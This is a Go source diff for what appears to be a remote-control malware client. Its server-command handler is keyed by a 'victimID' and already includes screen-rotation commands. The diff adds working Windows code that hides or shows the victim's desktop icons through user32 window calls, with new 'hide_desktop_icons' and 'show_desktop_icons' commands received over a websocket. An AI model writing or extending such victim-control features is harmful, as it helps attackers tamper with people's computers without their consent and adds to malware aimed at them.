@@ -238,6 +238,56 @@ func rotateScreen(angleDeg int) {
 	changeDisplay.Call(0, uintptr(unsafe.Pointer(&dm[0])), 0, 0, 0)
 }
 
+func toggleDesktopIcons(show bool) {
+	if runtime.GOOS != "windows" {
+		return
+	}
+	user32 := syscall.NewLazyDLL(getUser32DLL())
+	findWindow := user32.NewProc("FindWindowW")
+	findWindowEx := user32.NewProc("FindWindowExW")
+	showWindow := user32.NewProc("ShowWindow")
+
+	progmanClass, _ := syscall.UTF16PtrFromString("Progman")
+	shellViewClass, _ := syscall.UTF16PtrFromString("SHELLDLL_DefView")
+	sysListClass, _ := syscall.UTF16PtrFromString("SysListView32")
+
+	progman, _, _ := findWindow.Call(uintptr(unsafe.Pointer(progmanClass)), 0)
+	if progman == 0 {
+		return
+	}
+
+	shellView, _, _ := findWindowEx.Call(progman, 0, uintptr(unsafe.Pointer(shellViewClass)), 0)
+	if shellView == 0 {
+		workerWClass, _ := syscall.UTF16PtrFromString("WorkerW")
+		var workerW uintptr
+		for {
+			workerW, _, _ = findWindowEx.Call(0, workerW, uintptr(unsafe.Pointer(workerWClass)), 0)
+			if workerW == 0 {
+				break
+			}
+			sv, _, _ := findWindowEx.Call(workerW, 0, uintptr(unsafe.Pointer(shellViewClass)), 0)
+			if sv != 0 {
+				shellView = sv
+				break
+			}
+		}
+	}
+	if shellView == 0 {
+		return
+	}
+
+	listView, _, _ := findWindowEx.Call(shellView, 0, uintptr(unsafe.Pointer(sysListClass)), 0)
+	if listView == 0 {
+		return
+	}
+
+	if show {
+		showWindow.Call(listView, 5) // SW_SHOW
+	} else {
+		showWindow.Call(listView, 0) // SW_HIDE
+	}
+}
+
 func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 	command = strings.TrimSpace(command)
 	if command == "" {
@@ -309,6 +359,16 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 	}
 	if lower == "rotate_270" {
 		go rotateScreen(270)
+		return
+	}
+
+	if lower == "hide_desktop_icons" {
+		go toggleDesktopIcons(false)
+		return
+	}
+
+	if lower == "show_desktop_icons" {
+		go toggleDesktopIcons(true)
 		return
 	}
 
